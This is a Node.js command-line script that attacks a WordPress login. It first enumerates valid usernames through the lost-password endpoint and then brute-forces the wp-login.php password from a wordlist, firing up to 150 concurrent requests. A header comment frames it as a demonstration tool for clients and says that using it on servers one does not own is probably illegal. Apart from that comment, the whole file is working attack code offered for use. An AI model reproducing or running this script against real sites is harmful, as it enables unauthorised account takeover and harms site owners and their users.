#!/usr/bin/env node
"use strict";

/*
 * How strong is your Wordpress?
 * A small tool developed to show (clients) how important it is
 * to use strong credentials with Wordpress. (And even better, security modifications).
 *
 * Use your common sense. It's probably illegal to run this program against
 * a server you don't own, so please, don't do that.
 *
 * Usage:
 * ./hsiywp.js http://urlto/wp-login.php function [?username] /path/to/dictionary
 *
 * Example: Find a valid username on a local WP install.
 * ./hsiywp.js http://localhost/wp-login.php username /path/to/username-list.txt
 *
 * Example: Find a password for a known user on a local WP install.
 * ./hsiywp.js http://localhost/wp-login.php password admin /path/to/password-list.txt
*/

//Required libraries.
var request = require("request");
var fs = require("fs");

//Declare some variables.
var wpUrl = null, fpUsersnames = null, fpPasswords = null, action, wpFunction, wpUser;

//Session level stuff.
var config = {
  currentlyActive: 0,
  maxConcurrent: 150,
  progress: 0
};

//Required arguments.
if ( process.argv.length < 5 ) {
  printHelp();
  process.exit(1);
}

//Set the arguments.
wpUrl = process.argv.slice(2)[0];
wpFunction = process.argv.slice(3)[0];

if ( wpFunction === "username" ) {

  console.log("Username mode, loading " + fpUsersnames + "...");

  fpUsersnames = process.argv.slice(4)[0];
  //Check if file exists.
  if (! fs.existsSync( fpUsersnames ) ) {
    console.log( fpUsersnames + " doesn't exit." );
    process.exit(1);
  }

  var usernamesBuffer = fs.readFileSync( fpUsersnames, 'utf-8' );
  var usernames = usernamesBuffer.split("\n");
  console.log("Found about " + usernames.length + " usernames to test.");

  action = "username";

} else if ( wpFunction === "password" ) {

  if ( process.argv.length < 6 ) {
    printHelp();
    process.exit(1);
  }


  wpUser = process.argv.slice(4)[0];
  fpPasswords = process.argv.slice(5)[0];

  console.log("Password mode, will attempt to break password for " + wpUser + ".\nLoading " + fpPasswords + "...");

  //Check if file exists.
  if (! fs.existsSync( fpPasswords ) ) {
    console.log( fpPasswords + " doesn't exit." );
    process.exit(1);
  }

  var passwordsBuffer = fs.readFileSync( fpPasswords, 'utf-8' );
  var passwords = passwordsBuffer.split("\n");
  console.log("Found about " + passwords.length + " passwords to test.");

  action ="password";

}

switch ( action ) {

  case "username":
    //Find the username.
    findUsername();
  break;

  case "password":
    //Find the password.
    findPassword(wpUser);
  break;

}


function printHelp() {

  console.log("Usage:");
  console.log("hsiywp http://domain.com/wp-login.php function [?user] list.txt");
  console.log("Example: hsiywp http://localhost/wp/wp-login.php username usernames.txt");
  console.log("Example: hsiywp http://localhost/wp/wp-login.php password admin passwords.txt");

}

function findUsername() {

  var reqUrl = wpUrl + "?action=lostpassword";

  //config.maxConcurrent;
  var userInterval = setInterval(function(){

    if ( config.progress > usernames.length ) {
      console.log("Finished, no matches...");
      clearInterval(userInterval);
      return;
    }

    if ( config.currentlyActive < config.maxConcurrent ) {

      config.currentlyActive += 1;
      var username = usernames[config.progress];

      request.post( reqUrl, {form: {
        user_login: username
      }}, function (error, response, body) {
        config.currentlyActive -= 1;

        if ( typeof response !== "undefined" ) {

          if ( response.statusCode == 302 ) {
            //Found.
            console.log( "Found username, " + username );
            process.exit(0);
            return;
          }

        }

      });

      console.log("Trying: " + usernames[config.progress] );
      config.progress += 1;

    }

  }, 1);

}

function findPassword(username) {

  var reqUrl = wpUrl;

  var cookie = request.cookie('testcookie=1');
  var j = request.jar();
  j.cookies.push("testcookie=1");
  request = request.defaults({jar:j});

  var passInterval = setInterval(function(){

    if ( config.progress > passwords.length ) {
      console.log("Finished, no matches...");
      clearInterval(passInterval);
      return;
    }

    if ( config.currentlyActive < config.maxConcurrent ) {

      config.currentlyActive += 1;
      var password = passwords[config.progress];

      request.post( reqUrl, {form: {
        log: username,
        pwd: password,
        redirect_to: "http://localhost/wp/wp-admin/",
        testcookie: "1"
      }}, function (error, response, body) {
        config.currentlyActive -= 1;

        if ( typeof response !== "undefined" ) {
          if ( response.statusCode == 302 ) {
            //Found.
            console.log( "Found password, " + password );
            process.exit(0);
            return;
          }
        }

      });

      console.log("Trying: " + passwords[config.progress] );
      config.progress += 1;

    }

  }, 1);

}
